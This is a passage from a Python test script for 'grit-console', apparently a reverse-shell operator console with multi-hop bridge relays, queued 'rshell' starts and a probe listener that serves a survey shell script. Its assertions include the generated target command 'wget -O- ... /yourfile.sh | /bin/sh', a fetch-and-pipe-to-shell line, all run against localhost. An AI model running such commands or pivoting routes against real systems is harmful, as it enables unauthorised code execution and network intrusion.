                bridge_profile.get("route_path") != f"operator:{bridge_port} -> 127.0.0.1:{echo_result['port']}" or
                bridge_target.get("latest_bridge_profile") != "lab-http" or
                bridge_target.get("latest_bridge_operation") != "bridge_relay" or
                bridge_target.get("latest_bridge_status") != "closed" or
                bridge_target.get("latest_bridge_route_path") != f"operator:{bridge_port} -> 127.0.0.1:{echo_result['port']}" or
                ((bridge_status.get("targets_by_latest_bridge_profile") or {}).get("lab-http") or [{}])[0].get("target_id") != "target-bridge" or
                ((bridge_status.get("targets_by_latest_bridge_status") or {}).get("closed") or [{}])[0].get("target_id") != "target-bridge" or
                ((bridge_status.get("targets_by_has_latest_bridge_activity") or {}).get("yes") or [{}])[0].get("target_id") != "target-bridge" or
                ((bridge_status.get("bridge_profiles_by_name") or {}).get("chain-http") or {}).get("route_path") != expected_chain_path or
                bridge_status.get("summary", {}).get("bridge_profile_hop_count_counts", {}).get("2") != 1 or
                bridge_status.get("summary", {}).get("bridge_hop_record_count") != 3 or
                bridge_status.get("summary", {}).get("bridge_hop_profile_counts", {}).get("chain-http") != 2 or
                bridge_status.get("summary", {}).get("bridge_hop_profile_counts", {}).get("lab-http") != 1 or
                bridge_status.get("summary", {}).get("bridge_hop_multi_hop_counts", {}).get("True") != 2 or
                len(bridge_hops) != 3 or
                len(chain_status_hops) != 2 or
                ((bridge_status.get("bridge_hops_by_to") or {}).get("target-lan-device:80") or [{}])[0].get("profile") != "chain-http" or
                ((bridge_status.get("bridge_hops_by_is_first_hop") or {}).get("True") or [{}])[0].get("from") not in {f"operator:{bridge_port}"} or
                bridge_profile.get("has_last_successful_relay") is not True or
                not bridge_profile.get("last_successful_relay_at") or
                bridge_profile.get("has_last_failure") is not False or
                bridge_profile.get("last_bytes_from_client", 0) < len(b"hello") or
                bridge_profile.get("last_bytes_from_upstream", 0) < len(b"bridge:hello") or
                "lab-http" not in [rec.get("name") for rec in ((bridge_status.get("bridge_profiles_by_target_id") or {}).get("target-bridge") or [])] or
                ((bridge_status.get("bridge_profiles_by_has_last_successful_relay") or {}).get("True") or [{}])[0].get("name") != "lab-http" or
                len((bridge_status.get("bridge_profiles_by_has_last_failure") or {}).get("False") or []) != 2 or
                ((bridge_status.get("target_workflow_actions_by_requires_target_online") or {}).get("True") or [{}])[0].get("workflow") != "bridge" or
                ((bridge_status.get("target_workflow_actions_by_queues_offline_work") or {}).get("True") or [{}])[0].get("target_id") != "target-bridge" or
                "bridge_profiles_by_current_state" not in ((bridge_status.get("api_collections") or {}).get("bridge_profiles") or {}).get("indexes", []) or
                "bridge_profiles_by_hop_count" not in ((bridge_status.get("api_collections") or {}).get("bridge_profiles") or {}).get("indexes", []) or
                "bridge_profiles_by_has_last_successful_relay" not in ((bridge_status.get("api_collections") or {}).get("bridge_profiles") or {}).get("indexes", []) or
                "bridge_profiles_by_has_last_failure" not in ((bridge_status.get("api_collections") or {}).get("bridge_profiles") or {}).get("indexes", []) or
                "bridge_hops_by_profile" not in ((bridge_status.get("api_collections") or {}).get("bridge_hop_records") or {}).get("indexes", []) or
                "bridge_hops_by_to" not in ((bridge_status.get("api_collections") or {}).get("bridge_hop_records") or {}).get("indexes", []) or
                "bridge_profile_workflow_actions_by_operator_action_state" not in ((bridge_status.get("api_collections") or {}).get("bridge_profile_workflow_actions") or {}).get("indexes", []) or
                "bridge_profile_workflow_actions_by_fleet_mailbox_pending_work_count" not in ((bridge_status.get("api_collections") or {}).get("bridge_profile_workflow_actions") or {}).get("indexes", []) or
                not bridge_events.get("workbench_bridge_profile_inspected") or
                not bridge_events.get("workbench_bridge_profile_saved") or
                not bridge_events.get("workbench_bridge_profile_deleted") or
                not any(
                    event.get("service") == "bridge" and
                    "--stop --transport bridge" in event.get("details", {}).get("headless_command", "")
                    for event in bridge_events.get("service_stop", [])
                ) or
                not bridge_events.get("bridge_connected") or
                not bridge_events.get("bridge_closed") or
                bridge_events["bridge_closed"][0].get("details", {}).get("bridge_profile") != "lab-http" or
                bridge_events["bridge_closed"][0].get("details", {}).get("bytes_from_client", 0) < len(b"hello") or
                bridge_events["bridge_closed"][0].get("details", {}).get("bytes_from_upstream", 0) < len(b"bridge:hello")):
            print("json status missing bridge relay evidence", file=sys.stderr)
            print(json.dumps(bridge_status, indent=2, sort_keys=True), file=sys.stderr)
            return 1
        inspect_relay_profile = run(
            "scripts/grit-console",
            "--config", str(bridge_cfg),
            "--inspect-bridge-profile", "lab-http",
        )
        if (inspect_relay_profile.returncode != 0 or
                "relay: last_success=-" in inspect_relay_profile.stdout or
                "client_bytes=" not in inspect_relay_profile.stdout or
                "failure: last=- reason=-" not in inspect_relay_profile.stdout):
            print("bridge profile inspect missing relay lifecycle fields", file=sys.stderr)
            print(inspect_relay_profile.stdout, file=sys.stderr)
            print(inspect_relay_profile.stderr, file=sys.stderr)
            return 1
        bridge_action_inspect = run(
            "scripts/grit-console",
            "--config", str(bridge_cfg),
            "--run-bridge-profile-workflow-action", "lab-http:inspect-profile",
        )
        if (bridge_action_inspect.returncode != 0 or
                "bridge profile workflow action: lab-http:inspect-profile" not in bridge_action_inspect.stdout or
                "Bridge profile lab-http" not in bridge_action_inspect.stdout or
                f"operator:{bridge_port} -> 127.0.0.1:{echo_result['port']}" not in bridge_action_inspect.stdout):
            print("headless bridge profile workflow inspect action failed", file=sys.stderr)
            print(bridge_action_inspect.stdout, file=sys.stderr)
            print(bridge_action_inspect.stderr, file=sys.stderr)
            return 1
        bridge_action_dry_run = run(
            "scripts/grit-console",
            "--config", str(bridge_cfg),
            "--run-bridge-profile-workflow-action", "lab-http:start-profile",
            "--bridge-profile-workflow-dry-run",
        )
        if (bridge_action_dry_run.returncode != 0 or
                "bridge profile workflow action: lab-http:start-profile" not in bridge_action_dry_run.stdout or
                "dry_run=yes" not in bridge_action_dry_run.stdout or
                "command=scripts/grit-console --config" not in bridge_action_dry_run.stdout or
                "--transport bridge --bridge-profile lab-http" not in bridge_action_dry_run.stdout or
                "headless_command=" in bridge_action_dry_run.stdout):
            print("headless bridge profile workflow dry-run action failed", file=sys.stderr)
            print(bridge_action_dry_run.stdout, file=sys.stderr)
            print(bridge_action_dry_run.stderr, file=sys.stderr)
            return 1
        bridge_action_start = run(
            "scripts/grit-console",
            "--config", str(bridge_cfg),
            "--run-bridge-profile-workflow-action", "lab-http:start-profile",
        )
        if (bridge_action_start.returncode != 0 or
                "bridge profile workflow action: lab-http:start-profile" not in bridge_action_start.stdout or
                "started bridge:" not in bridge_action_start.stdout):
            print("headless bridge profile workflow start action failed", file=sys.stderr)
            print(bridge_action_start.stdout, file=sys.stderr)
            print(bridge_action_start.stderr, file=sys.stderr)
            return 1
        bridge_action_stop = run(
            "scripts/grit-console",
            "--config", str(bridge_cfg),
            "--run-bridge-profile-workflow-action", "lab-http:stop-profile",
            "--confirm-bridge-profile-workflow-action",
        )
        if (bridge_action_stop.returncode != 0 or
                "bridge profile workflow action: lab-http:stop-profile" not in bridge_action_stop.stdout or
                ("stopped bridge:" not in bridge_action_stop.stdout and "bridge: stale pid" not in bridge_action_stop.stdout)):
            print("headless bridge profile workflow stop action failed", file=sys.stderr)
            print(bridge_action_stop.stdout, file=sys.stderr)
            print(bridge_action_stop.stderr, file=sys.stderr)
            return 1
        delete_bridge_port = free_port()
        delete_bridge_dest_port = free_port()
        while delete_bridge_dest_port == delete_bridge_port:
            delete_bridge_dest_port = free_port()
        save_delete_bridge = run(
            "scripts/grit-console",
            "--config", str(bridge_cfg),
            "--save-bridge-profile", "delete-http",
            "--bridge-port", str(delete_bridge_port),
            "--bridge-dest-host", "127.0.0.1",
            "--bridge-dest-port", str(delete_bridge_dest_port),
            "--bridge-profile-purpose", "delete-runner",
        )
        if save_delete_bridge.returncode != 0 or "saved bridge profile delete-http" not in save_delete_bridge.stdout:
            print("failed to save bridge profile for workflow delete action", file=sys.stderr)
            print(save_delete_bridge.stdout, file=sys.stderr)
            print(save_delete_bridge.stderr, file=sys.stderr)
            return 1
        bridge_action_delete = run(
            "scripts/grit-console",
            "--config", str(bridge_cfg),
            "--run-bridge-profile-workflow-action", "delete-http:delete-profile",
            "--confirm-bridge-profile-workflow-action",
        )
        if (bridge_action_delete.returncode != 0 or
                "bridge profile workflow action: delete-http:delete-profile" not in bridge_action_delete.stdout or
                "deleted bridge profile delete-http" not in bridge_action_delete.stdout):
            print("headless bridge profile workflow delete action failed", file=sys.stderr)
            print(bridge_action_delete.stdout, file=sys.stderr)
            print(bridge_action_delete.stderr, file=sys.stderr)
            return 1

        queue_bridge_action = run(
            "scripts/grit-console",
            "--config", str(bridge_cfg),
            "--run-target-workflow-action", "target-bridge:queue-bridge-start:lab-http",
        )
        if (queue_bridge_action.returncode != 0 or
                "target workflow action: target-bridge:queue-bridge-start:lab-http" not in queue_bridge_action.stdout or
                "queued " not in queue_bridge_action.stdout or
                "grit rshell start" not in queue_bridge_action.stdout or
                "bridge_profile=lab-http" not in queue_bridge_action.stdout or
                f"route=operator:{bridge_port} -> 127.0.0.1:{echo_result['port']}" not in queue_bridge_action.stdout):
            print("bridge target workflow queue action failed", file=sys.stderr)
            print(queue_bridge_action.stdout, file=sys.stderr)
            print(queue_bridge_action.stderr, file=sys.stderr)
            return 1
        bridge_queue_status = json.loads(run(
            "scripts/grit-console",
            "--config", str(bridge_cfg),
            "--event-limit", "80",
            "--json-status",
        ).stdout)
        bridge_queue_records = ((bridge_queue_status.get("command_queue") or {}).get("commands_by_target_id") or {}).get("target-bridge") or []
        bridge_queue_actions_by_profile = bridge_queue_status.get("bridge_profile_workflow_actions_by_bridge_profile") or {}
        bridge_queue_lab_actions = {
            rec.get("action_id"): rec
            for rec in bridge_queue_actions_by_profile.get("lab-http", [])
        }
        bridge_queue_events = bridge_queue_status.get("events_by_event") or {}
        bridge_completed = [
            event.get("details") or {}
            for event in bridge_queue_events.get("target_workflow_action_completed", [])
            if (event.get("details") or {}).get("action_id") == "queue-bridge-start:lab-http"
        ]
        if (len(bridge_queue_records) != 1 or
                bridge_queue_records[0].get("command") != "grit rshell start" or
                bridge_queue_status.get("summary", {}).get("target_mailbox_pending_work_count") != 1 or
                bridge_queue_status.get("summary", {}).get("target_mailbox_status_counts", {}).get("queued") != 1 or
                bridge_queue_status.get("summary", {}).get("bridge_profile_workflow_action_fleet_target_count_counts", {}).get("1") != 8 or
                bridge_queue_status.get("summary", {}).get("bridge_profile_workflow_action_fleet_mailbox_pending_work_count_counts", {}).get("1") != 8 or
                bridge_queue_lab_actions.get("inspect-profile", {}).get("fleet_target_count") != 1 or
                bridge_queue_lab_actions.get("inspect-profile", {}).get("fleet_mailbox_pending_work_count") != 1 or
                bridge_queue_lab_actions.get("inspect-profile", {}).get("fleet_has_mailbox_pending_work") is not True or
                ((bridge_queue_status.get("target_mailbox_records_by_target_id") or {}).get("target-bridge") or [{}])[0].get("waiting_for") != "target-poll" or
                not bridge_completed or
                not bridge_queue_events.get("bridge_profile_workflow_action_selected") or
                not bridge_queue_events.get("bridge_profile_workflow_action_completed") or
                not bridge_queue_events.get("bridge_profile_workflow_action_dry_run") or
                bridge_queue_events.get("bridge_profile_workflow_action_dry_run", [{}])[-1].get("details", {}).get("fleet_mailbox_pending_work_count") != 0 or
                not any(
                    (event.get("details") or {}).get("action_id") == "delete-profile" and
                    (event.get("details") or {}).get("bridge_profile") == "delete-http"
                    for event in bridge_queue_events.get("bridge_profile_workflow_action_completed", [])
                ) or
                bridge_completed[-1].get("result") != "queued-bridge-start" or
                bridge_completed[-1].get("bridge_profile") != "lab-http" or
                bridge_completed[-1].get("queues_offline_work") is not True or
                bridge_completed[-1].get("target_phone_home_required") is not True or
                "operator:" not in bridge_completed[-1].get("bridge_route_path", "")):
            print("bridge queued mailbox action missing status/event evidence", file=sys.stderr)
            print(json.dumps(bridge_queue_status, indent=2, sort_keys=True), file=sys.stderr)
            return 1

        bad_bridge_port = free_port()
        bad_bridge_dest_port = free_port()
        while bad_bridge_dest_port == bad_bridge_port:
            bad_bridge_dest_port = free_port()
        save_bad_bridge = run(
            "scripts/grit-console",
            "--config", str(bridge_cfg),
            "--target-id", "target-bridge",
            "--target-label", "Bridge Target",
            "--save-bridge-profile", "bad-http",
            "--bridge-port", str(bad_bridge_port),
            "--bridge-dest-host", "127.0.0.1",
            "--bridge-dest-port", str(bad_bridge_dest_port),
            "--bridge-profile-purpose", "closed-port",
        )
        if save_bad_bridge.returncode != 0 or "saved bridge profile bad-http" not in save_bad_bridge.stdout:
            print("failed to save failing bridge profile", file=sys.stderr)
            print(save_bad_bridge.stdout, file=sys.stderr)
            print(save_bad_bridge.stderr, file=sys.stderr)
            return 1
        bad_bridge_proc = subprocess.Popen(
            [
                "scripts/grit-console",
                "--config", str(bridge_cfg),
                "--transport", "bridge",
                "--bridge-profile", "bad-http",
                "--timeout", "10",
                "--one-shot",
            ],
            cwd=ROOT,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        time.sleep(0.2)
        if bad_bridge_proc.poll() is not None:
            bad_out, bad_err = bad_bridge_proc.communicate(timeout=5)
            print("bad bridge listener exited before client connection", file=sys.stderr)
            print(bad_out, file=sys.stderr)
            print(bad_err, file=sys.stderr)
            return 1
        try:
            deadline = time.time() + 30
            connected_bad_bridge = False
            last_bad_bridge_error = None
            while time.time() < deadline and not connected_bad_bridge:
                try:
                    with socket.create_connection(("127.0.0.1", bad_bridge_port), timeout=0.5) as raw:
                        raw.sendall(b"hello")
                        connected_bad_bridge = True
                except OSError as exc:
                    last_bad_bridge_error = exc
                    time.sleep(0.05)
            if not connected_bad_bridge:
                bad_bridge_proc.terminate()
                bad_out, bad_err = bad_bridge_proc.communicate(timeout=5)
                print(f"bad bridge listener did not accept on expected port: {last_bad_bridge_error}", file=sys.stderr)
                print(bad_out, file=sys.stderr)
                print(bad_err, file=sys.stderr)
                return 1
            bad_out, bad_err = bad_bridge_proc.communicate(timeout=5)
        finally:
            if bad_bridge_proc.poll() is None:
                bad_bridge_proc.terminate()
                bad_bridge_proc.wait(timeout=5)
        if bad_bridge_proc.returncode != 0 or "bridge failed:" not in bad_err:
            print("bridge listener did not record closed-port failure cleanly", file=sys.stderr)
            print(bad_out, file=sys.stderr)
            print(bad_err, file=sys.stderr)
            return 1
        bridge_failure_status = json.loads(run(
            "scripts/grit-console",
            "--config", str(bridge_cfg),
            "--event-limit", "48",
            "--json-status",
        ).stdout)
        bad_bridge_profile = (bridge_failure_status.get("bridge_profiles_by_name") or {}).get("bad-http") or {}
        bridge_failure_target = (bridge_failure_status.get("targets_by_id") or {}).get("target-bridge") or {}
        bridge_failure_events = bridge_failure_status.get("events_by_event") or {}
        if (bridge_failure_status.get("summary", {}).get("bridge_profile_count") != 3 or
                bridge_failure_status.get("summary", {}).get("target_workflow_action_count") != 15 or
                bridge_failure_status.get("summary", {}).get("target_workflow_action_requires_target_online_count") != 3 or
                bridge_failure_status.get("summary", {}).get("target_workflow_action_queues_offline_work_count") != 7 or
                bridge_failure_status.get("summary", {}).get("target_latest_bridge_status_counts", {}).get("error") != 1 or
                bridge_failure_status.get("summary", {}).get("bridge_profile_has_last_successful_relay_counts", {}).get("True") != 1 or
                bridge_failure_status.get("summary", {}).get("bridge_profile_has_last_failure_counts", {}).get("True") != 1 or
                bridge_failure_target.get("latest_bridge_profile") != "bad-http" or
                bridge_failure_target.get("latest_bridge_operation") != "bridge_error" or
                bridge_failure_target.get("latest_bridge_status") != "error" or
                not bridge_failure_target.get("latest_bridge_failure_reason") or
                bad_bridge_profile.get("last_failure_reason") != bridge_failure_target.get("latest_bridge_failure_reason") or
                bad_bridge_profile.get("has_last_failure") is not True or
                not bad_bridge_profile.get("last_failure_at") or
                bad_bridge_profile.get("last_failure_dest_port") != bad_bridge_dest_port or
                ((bridge_failure_status.get("bridge_profiles_by_requires_target_online") or {}).get("True") or [{}])[0].get("target_id") != "target-bridge" or
                ((bridge_failure_status.get("bridge_profiles_by_has_last_failure") or {}).get("True") or [{}])[0].get("name") != "bad-http" or
                ((bridge_failure_status.get("targets_by_latest_bridge_status") or {}).get("error") or [{}])[0].get("target_id") != "target-bridge" or
                not bridge_failure_events.get("bridge_error") or
                bridge_failure_events["bridge_error"][0].get("details", {}).get("bridge_profile") != "bad-http"):
            print("json status missing bridge failure evidence", file=sys.stderr)
            print(json.dumps(bridge_failure_status, indent=2, sort_keys=True), file=sys.stderr)
            return 1

        survey_port = free_port()
        survey_cfg = Path(tmp) / "probe-config.json"
        survey_state = Path(tmp) / "probe-state.json"
        survey_operator_dir = Path(tmp) / "operator-session-probe"
        survey_cfg.write_text(json.dumps({
            "GRIT_RSHELL_TRANSPORT": "probe",
            "listen_host": "127.0.0.1",
            "GRIT_OPERATOR_SERVER_HOST": "127.0.0.1",
            "GRIT_PROBE_PORT": survey_port,
            "GRIT_PROBE_NAME": "yourfile.sh",
            "operator_session_dir": str(survey_operator_dir),
            "server_state": str(survey_state),
            "session_root": str(Path(tmp) / "probe-sessions"),
        }), encoding="utf-8")
        survey_proc = subprocess.Popen(
            [
                "scripts/grit-console",
                "--config", str(survey_cfg),
                "--transport", "probe",
                "--timeout", "1",
            ],
            cwd=ROOT,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        survey_get = connect_with_retry(
            survey_port,
            b"GET /yourfile.sh HTTP/1.1\r\n"
            b"Host: 127.0.0.1\r\n"
            b"X-Grit-Target-Id: target-survey\r\n"
            b"X-Grit-Target-Label: Survey Target\r\n"
            b"Connection: close\r\n\r\n",
        )
        if b"#!/bin/sh" not in survey_get or b"/probe/result" not in survey_get:
            print("probe script response missing shell script content", file=sys.stderr)
            return 1
        survey_body = b"schema=1&script=yourfile.sh&uname_s=Linux&uname_m=mipsel&uname_r=4.14&word_bits=32&endian=little"
        survey_post = connect_with_retry(
            survey_port,
            b"POST /probe/result HTTP/1.1\r\n"
            b"Host: 127.0.0.1\r\n"
            b"X-Grit-Target-Id: target-survey\r\n"
            b"X-Grit-Target-Label: Survey Target\r\n"
            b"Content-Type: application/x-www-form-urlencoded\r\n"
            + f"Content-Length: {len(survey_body)}\r\n".encode("ascii")
            + b"Connection: close\r\n\r\n"
            + survey_body,
        )
        if b'"status": "received"' not in survey_post or b'"architecture": "mipsel"' not in survey_post:
            print("probe result response missing received metadata", file=sys.stderr)
            print(survey_post.decode("utf-8", errors="replace"), file=sys.stderr)
            return 1
        out, err = survey_proc.communicate(timeout=5)
        if (survey_proc.returncode != 0 or
                f"Probe listener. Binding on http://127.0.0.1:{survey_port}/yourfile.sh" not in out or
                f"Probe target URL: http://127.0.0.1:{survey_port}/yourfile.sh" not in out):
            print("probe listener did not exit cleanly", file=sys.stderr)
            print(out, file=sys.stderr)
            print(err, file=sys.stderr)
            return 1
        survey_results = json.loads((survey_operator_dir / "probe-results.json").read_text(encoding="utf-8"))
        if survey_results.get("results", [{}])[0].get("architecture") != "mipsel":
            print("probe result ledger missing target architecture", file=sys.stderr)
            print(json.dumps(survey_results, indent=2, sort_keys=True), file=sys.stderr)
            return 1
        survey_status = json.loads(run(
            "scripts/grit-console",
            "--config", str(survey_cfg),
            "--json-status",
        ).stdout)
        survey_service = (survey_status.get("services_by_name") or {}).get("probe") or {}
        survey_target = (survey_status.get("targets_by_id") or {}).get("target-survey") or {}
        if (survey_service.get("port") != survey_port or
                survey_service.get("actual") != "stopped" or
                not (survey_status.get("events_by_event") or {}).get("probe_result") or
                survey_status.get("summary", {}).get("target_latest_survey_result_count") != 1 or
                survey_status.get("summary", {}).get("target_latest_survey_result_kind_counts", {}).get("probe") != 1 or
                survey_status.get("summary", {}).get("target_latest_survey_result_route_kind_counts", {}).get("direct") != 1 or
                survey_target.get("latest_survey_result_kind") != "probe" or
                survey_target.get("latest_survey_result_status") != "received" or
                survey_target.get("latest_survey_result_route_kind") != "direct" or
                survey_target.get("latest_probe_script_route_kind") != "direct" or
                survey_target.get("latest_activity_service") != "probe" or
                survey_target.get("latest_activity_operation") != "probe_result" or
                ((survey_status.get("targets_by_latest_survey_result_kind") or {}).get("probe") or [{}])[0].get("target_id") != "target-survey" or
                ((survey_status.get("targets_by_latest_survey_result_route_kind") or {}).get("direct") or [{}])[0].get("target_id") != "target-survey" or
                ((survey_status.get("targets_by_latest_survey_result_status") or {}).get("received") or [{}])[0].get("target_id") != "target-survey"):
            print("json status missing probe evidence", file=sys.stderr)
            print(json.dumps(survey_status, indent=2, sort_keys=True), file=sys.stderr)
            return 1
        direct_survey_commands = (survey_status.get("target_commands_by_service") or {}).get("probe") or []
        if (not direct_survey_commands or
                direct_survey_commands[0].get("route_kind") != "direct" or
                "wget -O- " not in direct_survey_commands[0].get("command", "") or
                "| /bin/sh" not in direct_survey_commands[0].get("command", "")):
            print("json status missing direct probe target command", file=sys.stderr)
            print(json.dumps(survey_status, indent=2, sort_keys=True), file=sys.stderr)
            return 1
        if run_probe_tftp_smoke(Path(tmp), result_port=survey_port) != 0:
            return 1
        survey_route_port = free_port()
        save_survey_route = run(
            "scripts/grit-console",
            "--config", str(survey_cfg),
            "--save-bridge-profile", "survey-route",
            "--bridge-port", str(survey_route_port),
            "--bridge-dest-host", "127.0.0.1",
            "--bridge-dest-port", str(survey_port),
            "--bridge-hop", f"operator:{survey_route_port}=rack-host:19001",
            "--bridge-hop", f"rack-host:19001=target-lan-device:{survey_port}",
        )
        if save_survey_route.returncode != 0 or "saved bridge profile survey-route" not in save_survey_route.stdout:
            print("survey bridge route profile save failed", file=sys.stderr)
            print(save_survey_route.stdout, file=sys.stderr)
            print(save_survey_route.stderr, file=sys.stderr)
            return 1
        bridged_survey_proc = subprocess.Popen(
            [
                "scripts/grit-console",
                "--config", str(survey_cfg),
                "--transport", "probe",
                "--bridge-profile", "survey-route",
                "--timeout", "10",
                "--one-shot",
            ],
            cwd=ROOT,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        bridged_script = request_with_retry(
            survey_port,
            b"GET /yourfile.sh HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n",
        )
        bridged_out, bridged_err = bridged_survey_proc.communicate(timeout=5)
        expected_survey_command = f"wget -O- http://127.0.0.1:{survey_route_port}/yourfile.sh | /bin/sh"
        if (bridged_survey_proc.returncode != 0 or
                f"http://127.0.0.1:{survey_route_port}/probe/result".encode("utf-8") not in bridged_script or
                expected_survey_command not in bridged_out or
                "bridge profile survey-route" not in bridged_out):
            print("bridged probe route did not render expected target command", file=sys.stderr)
            print(bridged_out, file=sys.stderr)
            print(bridged_err, file=sys.stderr)
            print(bridged_script.decode("utf-8", errors="replace"), file=sys.stderr)
            return 1
        bridged_survey_status = json.loads(run(
            "scripts/grit-console",
            "--config", str(survey_cfg),
            "--bridge-profile", "survey-route",
            "--json-status",
        ).stdout)
        bridged_survey_command = ((bridged_survey_status.get("target_commands_by_service") or {}).get("probe") or [{}])[0]
        bridged_service = (bridged_survey_status.get("services_by_name") or {}).get("probe") or {}
        bridged_survey_actions = bridged_survey_status.get("probe_workflow_actions") or []
        bridged_survey_actions_by_id = bridged_survey_status.get("probe_workflow_actions_by_id") or {}
        if (bridged_service.get("port") != survey_port or
                bridged_service.get("route_kind") != "bridge" or
                bridged_service.get("route_port") != survey_route_port or
                bridged_survey_command.get("route_kind") != "bridge" or
                bridged_survey_command.get("bridge_profile") != "survey-route" or
                bridged_survey_command.get("route_port") != survey_route_port or
                bridged_survey_command.get("command") != expected_survey_command or
                len(bridged_survey_actions) != 4 or
                bridged_survey_actions_by_id.get("probe:show-target-command", {}).get("target_command") != expected_survey_command or
                bridged_survey_actions_by_id.get("probe:show-target-command", {}).get("route_kind") != "bridge" or
                bridged_survey_actions_by_id.get("probe:show-target-command", {}).get("bridge_profile") != "survey-route" or
                bridged_survey_actions_by_id.get("probe:show-target-command", {}).get("run_command", "").find("--run-probe-workflow-action") == -1 or
                bridged_survey_actions_by_id.get("probe:show-target-command", {}).get("run_command", "").find("--bridge-profile survey-route") == -1 or
                bridged_survey_actions_by_id.get("probe:stop-probe", {}).get("run_command", "").find("--confirm-probe-workflow-action") == -1 or
                bridged_survey_actions_by_id.get("probe:start-probe", {}).get("headless_command", "").find("--bridge-profile survey-route") == -1 or
                bridged_survey_status.get("summary", {}).get("probe_workflow_action_count") != 4 or
                bridged_survey_status.get("summary", {}).get("probe_workflow_action_route_kind_counts", {}).get("bridge") != 4 or
                bridged_survey_status.get("summary", {}).get("probe_workflow_action_bridge_profile_counts", {}).get("survey-route") != 4 or
                "probe_workflow_actions_by_bridge_profile" not in ((bridged_survey_status.get("api_collections") or {}).get("probe_workflow_actions") or {}).get("indexes", []) or
                "target_commands_by_route_kind" not in ((bridged_survey_status.get("api_collections") or {}).get("target_command_records") or {}).get("indexes", [])):
            print("json status missing bridged probe route metadata", file=sys.stderr)
            print(json.dumps(bridged_survey_status, indent=2, sort_keys=True), file=sys.stderr)
            return 1
        bridged_survey_text_status = run(
            "scripts/grit-console",
            "--config", str(survey_cfg),
            "--bridge-profile", "survey-route",
            "--status",
        )
        if ("Generated target commands:" not in bridged_survey_text_status.stdout or
                "routes: bridge=" not in bridged_survey_text_status.stdout or
                "Probe workflow action summary:" not in bridged_survey_text_status.stdout or
                "probe routes: bridge=4" not in bridged_survey_text_status.stdout or
                "bridge profiles: survey-route=" not in bridged_survey_text_status.stdout or
                f"route=bridge bridge_profile=survey-route path=operator:{survey_route_port} -> rack-host:19001" not in bridged_survey_text_status.stdout or
                f"command={expected_survey_command}" not in bridged_survey_text_status.stdout):
            print("text status missing bridged survey target command route", file=sys.stderr)
            print(bridged_survey_text_status.stdout, file=sys.stderr)
            return 1
        bridged_survey_tui = run(
            "scripts/grit-console",
            "--config", str(survey_cfg),
            "--bridge-profile", "survey-route",
        )
        if ("Generated target commands:" not in bridged_survey_tui.stdout or
                "routes: bridge=" not in bridged_survey_tui.stdout or
                "bridge profiles: survey-route=" not in bridged_survey_tui.stdout or
                f"command={expected_survey_command}" not in bridged_survey_tui.stdout):
            print("workbench missing bridged survey target command route", file=sys.stderr)
            print(bridged_survey_tui.stdout, file=sys.stderr)
            return 1
        survey_tui_master, survey_tui_slave = pty.openpty()
        try:
            survey_tui_proc = subprocess.Popen(
                [
                    str(server),
                    "--config", str(survey_cfg),
                    "--bridge-profile", "survey-route",
                ],
                cwd=ROOT,
                stdin=survey_tui_slave,
                stdout=survey_tui_slave,
                stderr=subprocess.PIPE,
                text=True,
                env={**os.environ, "TERM": "dumb"},
            )
            os.close(survey_tui_slave)
            survey_tui_slave = -1
            time.sleep(0.5)
            os.write(survey_tui_master, b"19\ny\nq\n")
            _survey_line_stdout, survey_line_stderr = survey_tui_proc.communicate(timeout=8)
            survey_line_output = b""
            while True:
                try:
                    chunk = os.read(survey_tui_master, 65536)
                except OSError:
                    break
                if not chunk:
                    break
                survey_line_output += chunk
        finally:
            if survey_tui_slave != -1:
                os.close(survey_tui_slave)
            try:
                os.close(survey_tui_master)
            except OSError:
                pass
        survey_line_text = survey_line_output.decode("utf-8", errors="replace")
        if (survey_tui_proc.returncode != 0 or
                "Traceback" in (survey_line_stderr or "") or
                "Probe:" not in survey_line_text or
                f"target_command: {expected_survey_command}" not in survey_line_text or
                "probe_workflow_actions: 4" not in survey_line_text or
                "start_action_state=ready reason=run-now" not in survey_line_text or
                "details: events service=probe -n 3" not in survey_line_text or
                "headless_command" in survey_line_text or
                "bridge_profile=survey-route" not in survey_line_text):
            print("line console probe action did not show bridged command", file=sys.stderr)
            print(survey_line_text, file=sys.stderr)
            print(survey_line_stderr or "", file=sys.stderr)
            return 1
        survey_action_show = run(
            "scripts/grit-console",
            "--config", str(survey_cfg),
            "--bridge-profile", "survey-route",
            "--run-probe-workflow-action", "probe:show-target-command",
        )
        if (survey_action_show.returncode != 0 or
                "probe workflow action: probe:show-target-command" not in survey_action_show.stdout or
                f"target_command={expected_survey_command}" not in survey_action_show.stdout or
                "command=scripts/grit-console --config" not in survey_action_show.stdout or
                "headless_command=" in survey_action_show.stdout):
            print("headless probe workflow show action failed", file=sys.stderr)
            print(survey_action_show.stdout, file=sys.stderr)
            print(survey_action_show.stderr, file=sys.stderr)
            return 1
        survey_tui_status = json.loads(run(
            "scripts/grit-console",
            "--config", str(survey_cfg),
            "--bridge-profile", "survey-route",
            "--event-limit", "32",
            "--json-status",
        ).stdout)
        survey_tui_service = (survey_tui_status.get("services_by_name") or {}).get("probe") or {}
        if (survey_tui_service.get("actual") == "listening" or
                not (survey_tui_status.get("events_by_event") or {}).get("workbench_probe_started") or
                not (survey_tui_status.get("events_by_event") or {}).get("probe_workflow_action_selected") or
                not (survey_tui_status.get("events_by_event") or {}).get("probe_workflow_action_completed") or
                not any(
                    event.get("service") == "probe" and
                    "--transport probe" in event.get("details", {}).get("headless_command", "") and
                    "--bridge-profile survey-route" in event.get("details", {}).get("headless_command", "")
                    for event in (survey_tui_status.get("events_by_event") or {}).get("service_start_requested", [])
                ) or
                not any(
                    event.get("details", {}).get("probe_workflow_action_count") == 4
                    for event in (survey_tui_status.get("events_by_event") or {}).get("workbench_probe_started", [])
                ) or
                not (survey_tui_status.get("events_by_event") or {}).get("service_stop")):
            print("line console probe listener was not workbench-owned/stopped", file=sys.stderr)
            print(json.dumps(survey_tui_status, indent=2, sort_keys=True), file=sys.stderr)
            return 1

        if args.section == "integration-bridge-probe":
            print("grit-console smoke integration-bridge-probe ok")
            return 0

        command_copy_file = queue_operator_dir / "last-command.txt"
        copied = run(
            "scripts/grit-console",
            "--config", str(cfg),
            "--command-copy-file", str(command_copy_file),
            "--copy-target-command", "1",
        )
        if copied.returncode != 0 or "copied target command 1" not in copied.stdout:
            print("generated target command was not copied/exported", file=sys.stderr)
            print(copied.stdout, file=sys.stderr)
